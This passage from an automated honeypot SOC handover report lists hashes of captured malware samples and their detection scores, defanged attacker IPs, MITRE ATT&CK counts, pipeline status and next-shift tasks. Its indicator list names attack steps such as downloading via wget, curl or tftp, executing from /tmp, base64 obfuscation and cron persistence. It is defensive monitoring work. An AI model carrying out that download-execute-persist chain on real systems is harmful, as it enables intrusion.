| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **30/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 40/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `196.189.59[.]226` | ET | To__BRAS_DHCP_AD_10800E | **100** ⚠️ | 50 |
| `182.52.72[.]189` | TH | TOT Public Company Limited | **100** ⚠️ | 2 |
| `49.124.152[.]148` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 27 |
| `2.55.74[.]30` | IL | Partner Communications Ltd. | **100** ⚠️ | 40 |
| `14.54.22[.]11` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `186.239.41[.]74` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `194.165.16[.]161` | PL | Flyservers S.A. | **100** ⚠️ | 50 |
| `159.223.93[.]39` | SG | DigitalOcean, LLC | **100** ⚠️ | 19 |
| `209.38.121[.]186` | IN | DigitalOcean, LLC | **100** ⚠️ | 28 |
| `61.2.44[.]54` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 165 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 150 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 27 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 26 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 26 |

---

## 🔕 False Positive Summary (39 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 11 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 19 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 259 cases |
| Tool 34  | Credential Extractor        | ✅ 171 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 98 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 39 filtered (15.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 67 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 149 priority case(s) shown individually · 29 recon entry/entries in table (11 group(s) consolidating 53 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-08T05:01:45Z_
